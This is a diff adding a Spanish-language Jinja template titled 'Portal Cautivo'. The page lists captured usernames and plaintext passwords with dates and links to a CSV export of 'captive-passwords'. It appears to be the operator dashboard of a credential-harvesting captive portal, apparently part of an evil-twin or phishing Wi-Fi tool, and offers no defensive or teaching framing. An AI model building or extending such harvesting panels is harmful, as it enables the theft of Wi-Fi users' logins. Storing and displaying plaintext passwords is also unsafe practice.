@@ -1,0 +1,30 @@
+{% extends "base.html" %}
+
+{% block content %}
+
+<h1>Portal Cautivo</h1>
+
+<p><a href="/">Volver al Dashboard</a></p>
+
+<p><a href="/download/captive-passwords">Descargar CSV</a></p>
+
+<table border="1" cellpadding="8" cellspacing="0" width="100%">
+    <thead>
+        <tr>
+            <th>Fecha</th>
+            <th>Usuario</th>
+            <th>Password</th>
+        </tr>
+    </thead>
+    <tbody>
+        {% for u in users %}
+        <tr>
+            <td>{{ u["fecha"] }}</td>
+            <td>{{ u["usuario"] }}</td>
+            <td>{{ u["password"] }}</td>
+        </tr>
+        {% endfor %}
+    </tbody>
+</table>
+
+{% endblock %}
